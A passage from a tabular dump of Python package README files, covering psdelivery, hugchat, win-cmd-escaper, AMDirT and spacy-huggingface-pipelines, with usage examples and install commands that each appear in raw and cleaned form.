crawler = PsDelivery(topic='leetcode')

""""""
특정 페이지의 문제 리스트를 가져옵니다.
page:
    가져올 페이지 쪽수를 입력합니다. 반드시 1 이상이어야 합니다.
serialize:
    일반적인 리턴된 리스트의 요소는 ProblemItem이라는 객체 입니다. 
    serialize=True로 설정하면 ProblemItem을 Dict 형태로 직렬화 합니다. 
    Default값은 False 입니다.
""""""
result = crwaler.get_list_by_single_page(page=1)
""""""
return: [<ProbmeItem>, <ProblemItem>, ...]
""""""

result_as_json = crawler.get_list_by_single_page(page=2, serialize=True)
""""""
return: [<Dict>, <Dict>, ...]
""""""
```

","# 📦 psdelivery

[![Ubuntu](https://github.com/team-angeline/psdelivery/actions/workflows/test-ubuntu.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/test-ubuntu.yml)
[![Windows](https://github.com/team-angeline/psdelivery/actions/workflows/test-windows.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/test-windows.yml)
[![CI](https://github.com/team-angeline/psdelivery/actions/workflows/ci.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/ci.yml)
![GitHub](https://img.shields.io/github/license/team-angeline/psdelivery)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/psdelivery?logo=python&logoColor=white)
[![PyPI](https://img.shields.io/pypi/v/psdelivery?label=pypi%20package&logo=pypi&logoColor=white)](https://pypi.org/project/psdelivery)
[![codecov](https://codecov.io/gh/team-angeline/psdelivery/branch/main/graph/badge.svg?token=LFC7Z4PGCT)](https://codecov.io/gh/team-angeline/psdelivery)

```shell
pip install psdelivery
```

## Introduction 
여러 코딩 사이트의 코딩 문제들을 크롤링하는 라이브러리 입니다. 초기 버전이라 기본 수준의 기능만 지원하지만. 차후 더 많은 기능들을 추가할 예정입니다. 왜냐면 재가 제 메인 프로젝트에 쓸 거니깐요.

## 🙋‍♂️ Functions

### Implemented
* 해당 사이트에서 코딩문제를 가져올 수 있습니다.
    * 백준 (solved.ac)
    * 리트코드 (leetcode)
* 파이썬 프로젝트에 모듈로 사용할 수 있고, CLI 환경에서도 바로 사용할 수 있습니다.
    * CLI 환경해서 명령어를 통해 실행할 경우, 결과 데이터는 JSON으로 저장됩니다.

### Will be Implemented
* 해당 사이트에도 코딩문제를 가져올 예정입니다.
    * 코드포스 (codeforces)
    * 해커랭크 (hackerrank)
* 여러 페이지 범위의 문제 리스트를 뽑아올 수 있습니다.
    * 해당 사이트의 모든 문제들도 하나의 명령어로 가져올 수 있습니다.
* 특정 문제에 대한 세부 정보를 가져올 수 있습니다.
    * 알고리즘 태그를 가져올 수 있습니다.

## ⭐ Required
* 반드시 크롬이 설치되어 있어야 합니다.
    * Debian계열의 경우, bin디렉토리에 크롬을 설치하는 Shell Script가 있습니다.
* 파이썬 버전은 반드시 ```3.10``` 이상이어야 합니다.

## 💽 How To Install For Developer
크롬과 파이썬이 설치되어있다는 가정 하에 설명합니다.

1. requirements.txt를 통해 패키지를 설치합니다.
2. 끗

## Usage
### As Command Line
✔️ **Version 확인하기**
```shell
python -m psdelivery version

# 0.1.0
```

📚 **문제 리스트 가져오기**
```
python -m psdelivery getlist -t  -sp  -o 
```
* **Options**
    * -t(--topic): 코딩 페이지 사이트를 명시합니다. 데이터를 가지고올 수 있는 사이트는 다음과 같습니다.
        * 백준: ```baekjoon``` 또는 ```solved.ac```
        * 리트코드: ```leetcode```
    * -sp(--single-page): 페이지 인덱스를 나타냅니다. 해당 옵션을 명시하지 않으면 1페이지의 문제 리스트를 가져옵니다.
    * -o(--output): 코딩문제 데이터를 저장할 파일 루트를 명시합니다.
* **example**
    ```
    python -m psdelivery getlist -t baekjoon -sp 3 -o output.json
    ```

### As Python Module

```python
from psdelivery import PsDelivery

""""""
PsDelivery 객체 생성
topic은 크롤링할 사이트 이름을 입력합니다.

백준: baekjoon 또는 solved.ac
리트코드: leetcode
""""""
crawler = PsDelivery(topic='leetcode')

""""""
특정 페이지의 문제 리스트를 가져옵니다.
page:
    가져올 페이지 쪽수를 입력합니다. 반드시 1 이상이어야 합니다.
serialize:
    일반적인 리턴된 리스트의 요소는 ProblemItem이라는 객체 입니다. 
    serialize=True로 설정하면 ProblemItem을 Dict 형태로 직렬화 합니다. 
    Default값은 False 입니다.
""""""
result = crwaler.get_list_by_single_page(page=1)
""""""
return: [, , ...]
""""""

result_as_json = crawler.get_list_by_single_page(page=2, serialize=True)
""""""
return: [, , ...]
""""""
```

",team-angeline/psdelivery
hugchat,https://github.com/Soulter/hugging-chat-api,1,621,621,"# hugging-chat-api
HuggingChat Python API

[![PyPi](https://img.shields.io/pypi/v/hugchat.svg)](https://pypi.python.org/pypi/hugchat)
[![Support_Platform](https://img.shields.io/pypi/pyversions/hugchat)](https://pypi.python.org/pypi/hugchat)

- ChatGPT 平替！
- 无需任何账号，中国大陆的朋友无需梯子

# How to Use
```bash
pip install hugchat
```

```py
from hugchat import hugchat
chatbot = hugchat.ChatBot()
print(chatbot.chat(""HI""))

# New a conversation (ignore error)
id = chatbot.new_conversation()
chatbot.change_conversation(id)

# Get conversation list
conversation_list = chatbot.get_conversation_list()
```
","# hugging-chat-api
HuggingChat Python API

[![PyPi](https://img.shields.io/pypi/v/hugchat.svg)](https://pypi.python.org/pypi/hugchat)
[![Support_Platform](https://img.shields.io/pypi/pyversions/hugchat)](https://pypi.python.org/pypi/hugchat)

- ChatGPT 平替！
- 无需任何账号，中国大陆的朋友无需梯子

# How to Use
```bash
pip install hugchat
```

```py
from hugchat import hugchat
chatbot = hugchat.ChatBot()
print(chatbot.chat(""HI""))

# New a conversation (ignore error)
id = chatbot.new_conversation()
chatbot.change_conversation(id)

# Get conversation list
conversation_list = chatbot.get_conversation_list()
```
",soulter/hugging-chat-api
win-cmd-escaper,https://github.com/nicolas-van/win-cmd-escaper,0,5826,5826,"# win-cmd-escaper

[![Windows Tests](https://github.com/nicolas-van/win-cmd-escaper/actions/workflows/python-app.yml/badge.svg)](https://github.com/nicolas-van/win-cmd-escaper/actions/workflows/python-app.yml) [![PyPI](https://img.shields.io/pypi/v/win-cmd-escaper)](https://pypi.org/project/win-cmd-escaper/)

A Python library to properly handle escaping of command line arguments in both Windows' CMD.exe and Powershell.

## Usage

First install with `pip`:

```bash
pip install win_cmd_escaper
```

Then import the library and use the functions it provides:

```python
import win_cmd_escaper

print(win_cmd_escaper.escape_powershell_argument_script(""hello world"")) # escapes for Powershell

print(win_cmd_escaper.escape_cmd_argument_script(""hello world"")) # escapes for CMD

print(win_cmd_escaper.escape_cmd_argument_direct(""hello world"")) # escapes for CMD when using direct calls
```

## Rationale

This library was born out of frustration due to the apparent *completely unknown* behavior of CMD and Powershell regarding command line argument parsing. While bash is very well supported on that subject (notably having a [standard Python module](https://docs.python.org/3/library/shlex.html?highlight=shlex#module-shlex) handling both formatting and parsing) that's far from being the case for CMD and Powershell.

Concretely, *no one on earth* seems to have a real understanding of how those things are supposed to work and to have a clean algorithm to format command line arguments in those languages. A huge part of ressources available on Internet are just *wrong* or *lying*, including official documentation from Microsoft. Globally, *all* ""smart"" formatters you can find on whatever forums *do not work*. Well, to be fair, they usually work ""at least a little"". But none of them work *all the time*, for *all strings* (which is clearly what any serious programmer expects from a well designed formatter).

Due to the necessity to get the job done with those scripting languages I decided to create a pure *reverse engineering* project to try, as much as possible, to get something that really works in the real world of real things that work for real.

Also, while this library is in Python, it aims to be a reference implementation for anyone having the same need. The code is purposedly designed to be easy to read and to port to other programming languages.

## Known limitations

* ASCII control codes are not supported. This notably includes `\t`, `\r` and `\n`. (There doest't seem to have proper ways to encode these characters in CMD nor Powershell anyway.)
* Empty strings are not supported in Powershell. (It doesn't seem to be possible at all to pass an empty string as a command line argument in that *super well designed* language.)

## About non-ASCII characters

This library stays at the string level, which means it doesn't use any kind of magic related to Unicode or the current Windows code page. This is by design as it allows to generate valid strings that can be copy pasted and encoded as needed, not opaque blobs of bytes.

Concretely if you ask ""could it work with non-ASCII character?"", the answer could vastly depend. You should first know the following details:

* CMD doesn't seem to have any form of character encoding handling. For CMD a byte is a byte and will be forwarded as-is to underlying commands.
* Powershell is the opposite, it has encoding handling. It should be noted that its default encoding is assumed to be Windows' current code page unless you specify a BOM at the beginning of your `.ps1` file. It will then use whatever is specified by the BOM.
* To be short, Windows command-line arguments characters encoding is a global mess. Some programs will expect them to be in Windows' code page, other to be in UTF-8, some will use some kind of auto-detecting, auto-magic, auto-mojibake-making conversion layer between current code page and Unicode or vice-versa, etc...

Due to all this non-sense, non-ASCII characters in command line arguments is just unreliable on Windows and it will probably stay that way for as long as Microsoft doesn't publicly acnowledge that having C locale not using UTF-8 is both stupid, dysfunctional and racist. That means forever.

Normally, if you try to format a file path containing say, Latin-1 characters, on a Windows using cp-1252 code page, that you save that in a `.bat` or `.ps1` using that same cp-1252 encoding and that your destination program is kind of a ""typical"" Windows program, it ""should"" kinda works most of the time. That's about it for any kind of Unicode support we could expect related to command line arguments on Windows.

If you can, I would recommend to try to avoid these questions completely, as example using JSON (that has Unicode escapes handling) on top of ASCII for program-to-program communication. You will save yourself a lot of time.

## Contributing to this project

This project is, before anything else, a reverse engineering attempt. As such it is heavily centered around automatic tests.

Please note that ""blog posts"", ""forum threads"" and ""official documentation"" about CMD and Powershell *do* lie. As opposed to whatever piece of *** any Windows programmer or even Microsoft engineer could have written at one stage or another, this project only cares about making things that are *proven* to work.

So if you want to contribute to this project, which you are very welcome to do, please:

* Do not cite any Internet link in the issues supposedly explaining the behavior of CMD or Powershell. If you did not understand already I'm 100% convinced they are a total waste of time.
* Try to mostly work using the unit tests, they are our one and only source of truth in this arsh world.
* Take into account the fact that the unit tests *must* run in Github Actions using Github's Windows runners.
","# win-cmd-escaper

[![Windows Tests](https://github.com/nicolas-van/win-cmd-escaper/actions/workflows/python-app.yml/badge.svg)](https://github.com/nicolas-van/win-cmd-escaper/actions/workflows/python-app.yml) [![PyPI](https://img.shields.io/pypi/v/win-cmd-escaper)](https://pypi.org/project/win-cmd-escaper/)

A Python library to properly handle escaping of command line arguments in both Windows' CMD.exe and Powershell.

## Usage

First install with `pip`:

```bash
pip install win_cmd_escaper
```

Then import the library and use the functions it provides:

```python
import win_cmd_escaper

print(win_cmd_escaper.escape_powershell_argument_script(""hello world"")) # escapes for Powershell

print(win_cmd_escaper.escape_cmd_argument_script(""hello world"")) # escapes for CMD

print(win_cmd_escaper.escape_cmd_argument_direct(""hello world"")) # escapes for CMD when using direct calls
```

## Rationale

This library was born out of frustration due to the apparent *completely unknown* behavior of CMD and Powershell regarding command line argument parsing. While bash is very well supported on that subject (notably having a [standard Python module](https://docs.python.org/3/library/shlex.html?highlight=shlex#module-shlex) handling both formatting and parsing) that's far from being the case for CMD and Powershell.

Concretely, *no one on earth* seems to have a real understanding of how those things are supposed to work and to have a clean algorithm to format command line arguments in those languages. A huge part of ressources available on Internet are just *wrong* or *lying*, including official documentation from Microsoft. Globally, *all* ""smart"" formatters you can find on whatever forums *do not work*. Well, to be fair, they usually work ""at least a little"". But none of them work *all the time*, for *all strings* (which is clearly what any serious programmer expects from a well designed formatter).

Due to the necessity to get the job done with those scripting languages I decided to create a pure *reverse engineering* project to try, as much as possible, to get something that really works in the real world of real things that work for real.

Also, while this library is in Python, it aims to be a reference implementation for anyone having the same need. The code is purposedly designed to be easy to read and to port to other programming languages.

## Known limitations

* ASCII control codes are not supported. This notably includes `\t`, `\r` and `\n`. (There doest't seem to have proper ways to encode these characters in CMD nor Powershell anyway.)
* Empty strings are not supported in Powershell. (It doesn't seem to be possible at all to pass an empty string as a command line argument in that *super well designed* language.)

## About non-ASCII characters

This library stays at the string level, which means it doesn't use any kind of magic related to Unicode or the current Windows code page. This is by design as it allows to generate valid strings that can be copy pasted and encoded as needed, not opaque blobs of bytes.

Concretely if you ask ""could it work with non-ASCII character?"", the answer could vastly depend. You should first know the following details:

* CMD doesn't seem to have any form of character encoding handling. For CMD a byte is a byte and will be forwarded as-is to underlying commands.
* Powershell is the opposite, it has encoding handling. It should be noted that its default encoding is assumed to be Windows' current code page unless you specify a BOM at the beginning of your `.ps1` file. It will then use whatever is specified by the BOM.
* To be short, Windows command-line arguments characters encoding is a global mess. Some programs will expect them to be in Windows' code page, other to be in UTF-8, some will use some kind of auto-detecting, auto-magic, auto-mojibake-making conversion layer between current code page and Unicode or vice-versa, etc...

Due to all this non-sense, non-ASCII characters in command line arguments is just unreliable on Windows and it will probably stay that way for as long as Microsoft doesn't publicly acnowledge that having C locale not using UTF-8 is both stupid, dysfunctional and racist. That means forever.

Normally, if you try to format a file path containing say, Latin-1 characters, on a Windows using cp-1252 code page, that you save that in a `.bat` or `.ps1` using that same cp-1252 encoding and that your destination program is kind of a ""typical"" Windows program, it ""should"" kinda works most of the time. That's about it for any kind of Unicode support we could expect related to command line arguments on Windows.

If you can, I would recommend to try to avoid these questions completely, as example using JSON (that has Unicode escapes handling) on top of ASCII for program-to-program communication. You will save yourself a lot of time.

## Contributing to this project

This project is, before anything else, a reverse engineering attempt. As such it is heavily centered around automatic tests.

Please note that ""blog posts"", ""forum threads"" and ""official documentation"" about CMD and Powershell *do* lie. As opposed to whatever piece of *** any Windows programmer or even Microsoft engineer could have written at one stage or another, this project only cares about making things that are *proven* to work.

So if you want to contribute to this project, which you are very welcome to do, please:

* Do not cite any Internet link in the issues supposedly explaining the behavior of CMD or Powershell. If you did not understand already I'm 100% convinced they are a total waste of time.
* Try to mostly work using the unit tests, they are our one and only source of truth in this arsh world.
* Take into account the fact that the unit tests *must* run in Github Actions using Github's Windows runners.
",nicolas-van/win-cmd-escaper
amdirt,https://github.com/SPAAM-community/AMDirT,10,2452,2452,"[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.4003826.svg)](https://doi.org/10.5281/zenodo.4003826) [![PyPI version](https://badge.fury.io/py/AMDirT.svg)](https://pypi.org/project/AMDirT) [![Documentation Status](https://readthedocs.org/projects/amdirt/badge/?version=dev)](https://amdirt.readthedocs.io/en/dev/?badge=dev) [![AMDirT-CI](https://github.com/SPAAM-community/AMDirT/actions/workflows/ci_test.yml/badge.svg)](https://github.com/SPAAM-community/AMDirT/actions/workflows/ci_test.yml)

# AMDirT

**AMDirT**: [**A**ncient**M**etagenome**Dir**](https://github.com/SPAAM-community/ancientmetagenomedir) **T**oolkit

AMDirT is a toolkit for interacting with the AncientMetagenomeDir metadata repository of ancient metagenomic samples and ancient microbial genomes. This tool provides ways to validate AncientMetagenomeDir submissions, explore and download sequencing data for ancient microbial and environmental (meta)genomes, and automatically prepare input samplesheets for a range of bioinformatic processing pipelines.

For documentation on using the tool, please see [How Tos](how_to/index), [Tutorials](/tutorials) and/or [Quick Reference](/reference).

## Install

Before we release AMDirt on (bio)Conda, please follow the instructions below.

### 1. With pip

...upon release of v 1.4

### 2. With conda

...upon release of v 1.4

### The latest development version, directly from GitHub

```bash
pip install --upgrade --force-reinstall git+https://github.com/SPAAM-community/AMDirT.git@dev
```

### The latest development version, with local changes

- Fork AMDirT on GitHub
- Clone your fork `git clone [your-AMDirT-fork]`
- Checkout the `dev` branch `git switch dev`
- Create the conda environment `conda env create -f environment.yml`
- Activate the environment `conda activate amdirt`
- Install amdirt in development mode `pip install -e .`
    - In some cases you may need to force update streamlit with `pip install --upgrade steamlit`

To locally render documentation:

- `conda activate amdirt`
- Install additional requirements `cd docs && pip install -r requirements.txt`
- Build the HTML `make html`
- Open the `build/html/README.html` file in your browser

## More information

For more information, please see the AMDirT Documentation

- Stable: [amdirt.readthedocs.io/en/latest/](https://amdirt.readthedocs.io/en/latest/)
- Development version: [amdirt.readthedocs.io/en/dev/](https://amdirt.readthedocs.io/en/dev/)


","[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.4003826.svg)](https://doi.org/10.5281/zenodo.4003826) [![PyPI version](https://badge.fury.io/py/AMDirT.svg)](https://pypi.org/project/AMDirT) [![Documentation Status](https://readthedocs.org/projects/amdirt/badge/?version=dev)](https://amdirt.readthedocs.io/en/dev/?badge=dev) [![AMDirT-CI](https://github.com/SPAAM-community/AMDirT/actions/workflows/ci_test.yml/badge.svg)](https://github.com/SPAAM-community/AMDirT/actions/workflows/ci_test.yml)

# AMDirT

**AMDirT**: [**A**ncient**M**etagenome**Dir**](https://github.com/SPAAM-community/ancientmetagenomedir) **T**oolkit

AMDirT is a toolkit for interacting with the AncientMetagenomeDir metadata repository of ancient metagenomic samples and ancient microbial genomes. This tool provides ways to validate AncientMetagenomeDir submissions, explore and download sequencing data for ancient microbial and environmental (meta)genomes, and automatically prepare input samplesheets for a range of bioinformatic processing pipelines.

For documentation on using the tool, please see [How Tos](how_to/index), [Tutorials](/tutorials) and/or [Quick Reference](/reference).

## Install

Before we release AMDirt on (bio)Conda, please follow the instructions below.

### 1. With pip

...upon release of v 1.4

### 2. With conda

...upon release of v 1.4

### The latest development version, directly from GitHub

```bash
pip install --upgrade --force-reinstall git+https://github.com/SPAAM-community/AMDirT.git@dev
```

### The latest development version, with local changes

- Fork AMDirT on GitHub
- Clone your fork `git clone [your-AMDirT-fork]`
- Checkout the `dev` branch `git switch dev`
- Create the conda environment `conda env create -f environment.yml`
- Activate the environment `conda activate amdirt`
- Install amdirt in development mode `pip install -e .`
    - In some cases you may need to force update streamlit with `pip install --upgrade steamlit`

To locally render documentation:

- `conda activate amdirt`
- Install additional requirements `cd docs && pip install -r requirements.txt`
- Build the HTML `make html`
- Open the `build/html/README.html` file in your browser

## More information

For more information, please see the AMDirT Documentation

- Stable: [amdirt.readthedocs.io/en/latest/](https://amdirt.readthedocs.io/en/latest/)
- Development version: [amdirt.readthedocs.io/en/dev/](https://amdirt.readthedocs.io/en/dev/)


",spaam-community/amdirt
spacy-huggingface-pipelines,https://github.com/explosion/spacy-huggingface-pipelines,3,8449,8321,"<a href=""https://explosion.ai""><img src=""https://explosion.ai/assets/img/logo.svg"" width=""125"" height=""125"" align=""right"" /></a>

# spacy-huggingface-pipelines: Use pretrained transformer models for text and token classification

This package provides [spaCy](https://github.com/explosion/spaCy) components to
use pretrained
[Hugging Face Transformers pipelines](https://huggingface.co/docs/transformers/main_classes/pipelines)
for inference only.

[![PyPi](https://img.shields.io/pypi/v/spacy-huggingface-pipelines.svg?style=flat-square&logo=pypi&logoColor=white)](https://pypi.python.org/pypi/spacy-huggingface-pipelines)
[![GitHub](https://img.shields.io/github/release/explosion/spacy-huggingface-pipelines/all.svg?style=flat-square&logo=github)](https://github.com/explosion/spacy-huggingface-pipelines/releases)

## Features

- Apply pretrained transformers models like
  [`dslim/bert-base-NER`](https://huggingface.co/dslim/bert-base-NER) and
  [`distilbert-base-uncased-finetuned-sst-2-english`](https://huggingface.co/distilbert-base-uncased-finetuned-sst-2-english).

## 🚀 Installation

Installing the package from pip will automatically install all dependencies,
including PyTorch and spaCy.

```bash
pip install -U pip setuptools wheel
pip install spacy-huggingface-pipelines
```

For GPU installation, follow the
[spaCy installation quickstart with GPU](https://spacy.io/usage/), e.g.

```bash
pip install -U spacy[cuda-autodetect]
```

If you are having trouble installing PyTorch, follow the
[instructions](https://pytorch.org/get-started/locally/) on the official website
for your specific operating system and requirements.

## 📖 Documentation

This module provides spaCy wrappers for the inference-only transformers
[`TokenClassificationPipeline`](https://huggingface.co/docs/transformers/main/en/main_classes/pipelines#transformers.TokenClassificationPipeline)
and
[`TextClassificationPipeline`](https://huggingface.co/docs/transformers/main/en/main_classes/pipelines#transformers.TextClassificationPipeline)
pipelines.

The models are downloaded on initialization from the
[Hugging Face Hub](https://huggingface.co/models) if they're not already in your
local cache, or alternatively they can be loaded from a local path.

Note that the transformer model data **is not saved with the pipeline** when you
call `nlp.to_disk`, so if you are loading pipelines in an environment with
limited internet access, make sure the model is available in your
[transformers cache directory](https://huggingface.co/docs/transformers/main/en/installation#cache-setup)
and enable offline mode if needed.

### Token classification

Config settings for `hf_token_pipe`:

```ini
[components.hf_token_pipe]
factory = ""hf_token_pipe""
model = ""dslim/bert-base-NER""     # Model name or path
revision = ""main""                 # Model revision
aggregation_strategy = ""average""  # ""simple"", ""first"", ""average"", ""max""
stride = 16                       # If stride >= 0, process long texts in
                                  # overlapping windows of the model max
                                  # length. The value is the length of the
                                  # window overlap in transformer tokenizer
                                  # tokens, NOT the length of the stride.
kwargs = {}                       # Any additional arguments for
                                  # TokenClassificationPipeline
alignment_mode = ""strict""         # ""strict"", ""contract"", ""expand""
annotate = ""ents""                 # ""ents"", ""pos"", ""spans"", ""tag""
annotate_spans_key = null         # Doc.spans key for annotate = ""spans""
scorer = null                     # Optional scorer
```

#### `TokenClassificationPipeline` settings

- `model`: The model name or path.
- `revision`: The model revision. For production use, a specific git commit is
  recommended instead of the default `main`.
- `stride`: For `stride >= 0`, the text is processed in overlapping windows
  where the `stride` setting specifies the number of overlapping tokens between
  windows (NOT the stride length). If `stride` is `None`, then the text may be
  truncated. `stride` is only supported for fast tokenizers.
- `aggregation_strategy`: The aggregation strategy determines the word-level
  tags for cases where subwords within one word do not receive the same
  predicted tag. See:
  https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TokenClassificationPipeline.aggregation_strategy
- `kwargs`: Any additional arguments to
  [`TokenClassificationPipeline`](https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TokenClassificationPipeline).

#### spaCy settings

- `alignment_mode` determines how transformer predictions are aligned to spaCy
  token boundaries as described for
  [`Doc.char_span`](https://spacy.io/api/doc#char_span).
- `annotate` and `annotate_spans_key` configure how the annotation is saved to
  the spaCy doc. You can save the output as `token.tag_`, `token.pos_` (only for
  UPOS tags), `doc.ents` or `doc.spans`.

#### Examples

1. Save named entity annotation as `Doc.ents`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(""hf_token_pipe"", config={""model"": ""dslim/bert-base-NER""})
doc = nlp(""My name is Sarah and I live in London"")
print(doc.ents)
# (Sarah, London)
```

2. Save named entity annotation as `Doc.spans[spans_key]`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={
        ""model"": ""dslim/bert-base-NER"",
        ""annotate"": ""spans"",
        ""annotate_spans_key"": ""bert-base-ner"",
    },
)
doc = nlp(""My name is Sarah and I live in London"")
print(doc.spans[""bert-base-ner""])
# [Sarah, London]
```

3. Save fine-grained tags as `Token.tag`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={
        ""model"": ""QCRI/bert-base-multilingual-cased-pos-english"",
        ""annotate"": ""tag"",
    },
)
doc = nlp(""My name is Sarah and I live in London"")
print([t.tag_ for t in doc])
# ['PRP$', 'NN', 'VBZ', 'NNP', 'CC', 'PRP', 'VBP', 'IN', 'NNP']
```

4. Save coarse-grained tags as `Token.pos`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={""model"": ""vblagoje/bert-english-uncased-finetuned-pos"", ""annotate"": ""pos""},
)
doc = nlp(""My name is Sarah and I live in London"")
print([t.pos_ for t in doc])
# ['PRON', 'NOUN', 'AUX', 'PROPN', 'CCONJ', 'PRON', 'VERB', 'ADP', 'PROPN']
```

### Text classification

Config settings for `hf_text_pipe`:

```ini
[components.hf_text_pipe]
factory = ""hf_text_pipe""
model = ""distilbert-base-uncased-finetuned-sst-2-english""  # Model name or path
revision = ""main""                 # Model revision
kwargs = {}                       # Any additional arguments for
                                  # TextClassificationPipeline
scorer = null                     # Optional scorer
```

The input texts are truncated according to the transformers model max length.

#### `TextClassificationPipeline` settings

- `model`: The model name or path.
- `revision`: The model revision. For production use, a specific git commit is
  recommended instead of the default `main`.
- `kwargs`: Any additional arguments to
  [`TextClassificationPipeline`](https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TextClassificationPipeline).

#### Example

```python
import spacy

nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_text_pipe"",
    config={""model"": ""distilbert-base-uncased-finetuned-sst-2-english""},
)
doc = nlp(""This is great!"")
print(doc.cats)
# {'POSITIVE': 0.9998694658279419, 'NEGATIVE': 0.00013048505934420973}
```

### Batching and GPU

Both token and text classification support batching with `nlp.pipe`:

```python
for doc in nlp.pipe(texts, batch_size=256):
    do_something(doc)
```

If the component runs into an error processing a batch (e.g. on an empty text),
`nlp.pipe` will back off to processing each text individually. If it runs into
an error on an individual text, a warning is shown and the doc is returned
without additional annotation.

Switch to GPU:

```python
import spacy
spacy.require_gpu()

for doc in nlp.pipe(texts):
    do_something(doc)
```

## Bug reports and issues

Please report bugs in the
[spaCy issue tracker](https://github.com/explosion/spaCy/issues) or open a new
thread on the [discussion board](https://github.com/explosion/spaCy/discussions)
for other issues.
","

# spacy-huggingface-pipelines: Use pretrained transformer models for text and token classification

This package provides [spaCy](https://github.com/explosion/spaCy) components to
use pretrained
[Hugging Face Transformers pipelines](https://huggingface.co/docs/transformers/main_classes/pipelines)
for inference only.

[![PyPi](https://img.shields.io/pypi/v/spacy-huggingface-pipelines.svg?style=flat-square&logo=pypi&logoColor=white)](https://pypi.python.org/pypi/spacy-huggingface-pipelines)
[![GitHub](https://img.shields.io/github/release/explosion/spacy-huggingface-pipelines/all.svg?style=flat-square&logo=github)](https://github.com/explosion/spacy-huggingface-pipelines/releases)

## Features

- Apply pretrained transformers models like
  [`dslim/bert-base-NER`](https://huggingface.co/dslim/bert-base-NER) and
  [`distilbert-base-uncased-finetuned-sst-2-english`](https://huggingface.co/distilbert-base-uncased-finetuned-sst-2-english).

## 🚀 Installation

Installing the package from pip will automatically install all dependencies,
including PyTorch and spaCy.

```bash
pip install -U pip setuptools wheel
pip install spacy-huggingface-pipelines
```

For GPU installation, follow the
[spaCy installation quickstart with GPU](https://spacy.io/usage/), e.g.

```bash
pip install -U spacy[cuda-autodetect]
```

If you are having trouble installing PyTorch, follow the
[instructions](https://pytorch.org/get-started/locally/) on the official website
for your specific operating system and requirements.

## 📖 Documentation

This module provides spaCy wrappers for the inference-only transformers
[`TokenClassificationPipeline`](https://huggingface.co/docs/transformers/main/en/main_classes/pipelines#transformers.TokenClassificationPipeline)
and
[`TextClassificationPipeline`](https://huggingface.co/docs/transformers/main/en/main_classes/pipelines#transformers.TextClassificationPipeline)
pipelines.

The models are downloaded on initialization from the
[Hugging Face Hub](https://huggingface.co/models) if they're not already in your
local cache, or alternatively they can be loaded from a local path.

Note that the transformer model data **is not saved with the pipeline** when you
call `nlp.to_disk`, so if you are loading pipelines in an environment with
limited internet access, make sure the model is available in your
[transformers cache directory](https://huggingface.co/docs/transformers/main/en/installation#cache-setup)
and enable offline mode if needed.

### Token classification

Config settings for `hf_token_pipe`:

```ini
[components.hf_token_pipe]
factory = ""hf_token_pipe""
model = ""dslim/bert-base-NER""     # Model name or path
revision = ""main""                 # Model revision
aggregation_strategy = ""average""  # ""simple"", ""first"", ""average"", ""max""
stride = 16                       # If stride >= 0, process long texts in
                                  # overlapping windows of the model max
                                  # length. The value is the length of the
                                  # window overlap in transformer tokenizer
                                  # tokens, NOT the length of the stride.
kwargs = {}                       # Any additional arguments for
                                  # TokenClassificationPipeline
alignment_mode = ""strict""         # ""strict"", ""contract"", ""expand""
annotate = ""ents""                 # ""ents"", ""pos"", ""spans"", ""tag""
annotate_spans_key = null         # Doc.spans key for annotate = ""spans""
scorer = null                     # Optional scorer
```

#### `TokenClassificationPipeline` settings

- `model`: The model name or path.
- `revision`: The model revision. For production use, a specific git commit is
  recommended instead of the default `main`.
- `stride`: For `stride >= 0`, the text is processed in overlapping windows
  where the `stride` setting specifies the number of overlapping tokens between
  windows (NOT the stride length). If `stride` is `None`, then the text may be
  truncated. `stride` is only supported for fast tokenizers.
- `aggregation_strategy`: The aggregation strategy determines the word-level
  tags for cases where subwords within one word do not receive the same
  predicted tag. See:
  https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TokenClassificationPipeline.aggregation_strategy
- `kwargs`: Any additional arguments to
  [`TokenClassificationPipeline`](https://huggingface.co/docs/transformers/main_classes/pipelines#transformers.TokenClassificationPipeline).

#### spaCy settings

- `alignment_mode` determines how transformer predictions are aligned to spaCy
  token boundaries as described for
  [`Doc.char_span`](https://spacy.io/api/doc#char_span).
- `annotate` and `annotate_spans_key` configure how the annotation is saved to
  the spaCy doc. You can save the output as `token.tag_`, `token.pos_` (only for
  UPOS tags), `doc.ents` or `doc.spans`.

#### Examples

1. Save named entity annotation as `Doc.ents`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(""hf_token_pipe"", config={""model"": ""dslim/bert-base-NER""})
doc = nlp(""My name is Sarah and I live in London"")
print(doc.ents)
# (Sarah, London)
```

2. Save named entity annotation as `Doc.spans[spans_key]`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={
        ""model"": ""dslim/bert-base-NER"",
        ""annotate"": ""spans"",
        ""annotate_spans_key"": ""bert-base-ner"",
    },
)
doc = nlp(""My name is Sarah and I live in London"")
print(doc.spans[""bert-base-ner""])
# [Sarah, London]
```

3. Save fine-grained tags as `Token.tag`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={
        ""model"": ""QCRI/bert-base-multilingual-cased-pos-english"",
        ""annotate"": ""tag"",
    },
)
doc = nlp(""My name is Sarah and I live in London"")
print([t.tag_ for t in doc])
# ['PRP$', 'NN', 'VBZ', 'NNP', 'CC', 'PRP', 'VBP', 'IN', 'NNP']
```

4. Save coarse-grained tags as `Token.pos`:

```python
import spacy
nlp = spacy.blank(""en"")
nlp.add_pipe(
    ""hf_token_pipe"",
    config={""model"": ""vblagoje/bert-english-uncased-finetuned-pos"", ""annotate"": ""pos""},
)
doc = nlp(""My name is Sarah and I live in London"")
print([t.pos_ for t in doc])
